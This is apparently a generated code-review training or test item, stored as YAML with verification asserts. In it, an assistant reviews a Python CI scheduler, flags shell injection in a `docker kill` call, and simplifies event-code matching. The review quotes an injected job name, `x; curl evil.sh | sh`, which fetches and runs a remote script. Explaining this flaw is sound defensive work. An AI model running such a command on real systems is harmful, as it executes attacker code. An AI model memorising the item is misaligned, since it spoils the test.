@@ -1,0 +1,95 @@
+id: gen-1-00273-review
+category: review
+language: python
+patterns:
+- simple-conditions
+facts:
+- F-COND
+messages:
+- role: user
+  content: |
+    Can you review this module from our CI scheduler? Requirements: it gets an event from every runner agent (about 800 runners, several events per second in total), maps the numeric event code to the next action, and then does the side effect. The code table is fixed and documented: start = 100/150, heartbeat = 200/210/220, retry = 301/303/305, fail = 500/501/502/504, cancel = 900, everything else is ignored. I care about correctness first, but the scheduler runs on a shared VM, so tell me if anything is wasteful.
+
+    ```python
+    import logging
+    import subprocess
+
+    log = logging.getLogger("ci.scheduler")
+
+
+    def next_action(code):
+        if 100 <= code < 200 and code % 50 == 0:
+            return "start"
+        if 200 <= code < 230 and code % 10 == 0:
+            return "heartbeat"
+        if 300 < code < 306 and code % 2 == 1:
+            return "retry"
+        if 500 <= code <= 504 and code != 503:
+            return "fail"
+        if code // 100 == 9 and code % 100 == 0:
+            return "cancel"
+        return "ignore"
+
+
+    def handle_event(event):
+        code = event["code"]
+        job = event["job"]
+        action = next_action(code)
+        if action == "cancel":
+            subprocess.run(f"docker kill ci-{job}", shell=True)
+        elif action == "fail":
+            log.error("job %s failed with code %s", job, code)
+        elif action == "retry":
+            log.warning("job %s asked for retry (code %s)", job, code)
+        return action
+    ```
+- role: assistant
+  content: |
+    **Workload:** cloud backend (CI scheduler, per-event work)
+
+    #### [Security] Shell command built from the job name
+    - **Where:** `subprocess.run(f"docker kill ci-{job}", shell=True)` in `handle_event`
+    - **Issue:** `job` comes from the runner event. A name like `x; curl evil.sh | sh` runs on the scheduler host. A runner can also send a name with spaces or flags and kill the wrong container.
+    - **Fix:** pass an argument list and no shell:
+      ```python
+      subprocess.run(["docker", "kill", f"ci-{job}"], check=False)
+      ```
+      If job names have a known format, validate them before this call.
+
+    #### [Medium] Range and modulo guards for a fixed set of codes
+    - **Where:** all five conditions in `next_action`
+    - **Issue:** every event goes through chained range checks, `%` and `//`, but the table only has a few exact codes. In Green Metrics Tool micro-benchmarks, 10,000,000 classifications with simple equality branches used ~46 J of CPU energy and range/modulo conditions ~54 J, about 16% less. The gap is small per event, so this is Medium. The simple version is also easier to check against your code table.
+    - **Fix:** compare against the exact codes. The result is the same for every input, including the codes that fall into `ignore`:
+
+    ```python
+    def next_action(code):
+        if code == 100 or code == 150:
+            return "start"
+        if code == 200 or code == 210 or code == 220:
+            return "heartbeat"
+        if code == 301 or code == 303 or code == 305:
+            return "retry"
+        if code == 500 or code == 501 or code == 502 or code == 504:
+            return "fail"
+        if code == 900:
+            return "cancel"
+        return "ignore"
+    ```
+
+    - **Impact:** E on the scheduler CPU, for every event. If you add codes later, add them to this list. Do not rewrite the chain as `match` for speed: in the same measurements `match` and `if/elif` with the same conditions differed by about 1%, which is noise.
+
+    **Already good:** `next_action` has no side effects, so it is easy to test. The log calls use lazy `%s` formatting, so the strings are only built when the level is enabled.
+verify:
+  green_block: 0
+  test: |
+    assert next_action(100) == "start" and next_action(150) == "start"
+    assert next_action(210) == "heartbeat"
+    assert next_action(303) == "retry"
+    assert next_action(504) == "fail" and next_action(503) == "ignore"
+    assert next_action(900) == "cancel" and next_action(950) == "ignore"
+    assert next_action(0) == "ignore"
+  equivalence:
+    driver: |-
+      for c in range(-50, 1200):
+          print(c, next_action(c))
+      print(next_action(100.0), next_action(150.0), next_action(210.0), next_action(100.5))
